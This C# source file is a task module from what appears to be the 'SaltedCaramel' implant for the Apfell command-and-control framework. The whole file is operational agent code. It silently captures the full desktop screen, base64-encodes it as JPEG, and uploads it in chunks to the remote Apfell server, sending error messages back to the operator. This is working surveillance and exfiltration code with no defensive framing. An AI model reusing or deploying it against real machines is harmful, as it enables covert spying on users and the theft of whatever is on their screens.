using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Apfell.Structs;
using SaltedCaramel.Jobs;

/// <summary>
/// This task will capture a screenshot and upload it to the Apfell server
/// </summary>
namespace SaltedCaramel.Tasks
{
    public class ScreenCapture
    {
        /// <summary>
        /// Capture the screen associated with the current
        /// desktop session.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="implant">Agent associated with this task.</param>
        public static void Execute(Job job, SCImplant implant)
        {
            SCTask task = job.Task;
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
            Graphics g = Graphics.FromImage(bm);
            g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

            using (MemoryStream ms = new MemoryStream())
            {
                bm.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                byte[] screenshot = ms.ToArray();

                SendCapture(implant, task, screenshot);
            }
        }


        /// <summary>
        /// Send a chunked screenshot response to the Apfell server.
        /// </summary>
        /// <param name="implant">Agent that will be sending the data.</param>
        /// <param name="task">Task associated with the screenshot.</param>
        /// <param name="screenshot">Byte array of data that holds a chuked screenshot response.</param>
        private static void SendCapture(SCImplant implant, SCTask task, byte[] screenshot)
        {
            try // Try block for HTTP request
            {
                // Send total number of chunks to Apfell server
                // Number of chunks will always be one for screen capture task
                // Receive file ID in response
                SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + 1 + ", \"task\":\"" + task.id + "\"}");

                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.TryGetPostResponse(initial));
                Debug.WriteLine($"[-] SendCapture - Received reply, file ID: " + reply.file_id);

                // Convert chunk to base64 blob and create our FileChunk
                FileChunk fc = new FileChunk();
                fc.chunk_num = 1;
                fc.file_id = reply.file_id;
                fc.chunk_data = Convert.ToBase64String(screenshot);

                // Send our FileChunk to Apfell server
                // Receive status in response
                SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fc));
                Debug.WriteLine($"[+] SendCapture - CHUNK SENT: {fc.chunk_num}");
                string postReply = implant.TryGetPostResponse(response);
                Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.Profile.PostResponse(response)}");

                // Tell the Apfell server file transfer is done
                implant.TrySendComplete(task.id);
            }
            catch (Exception e) // Catch exceptions from HTTP requests
            {
                // Something failed, so we need to tell the server about it
                task.status = "error";
                task.message = e.Message;
            }
        }
    }
}
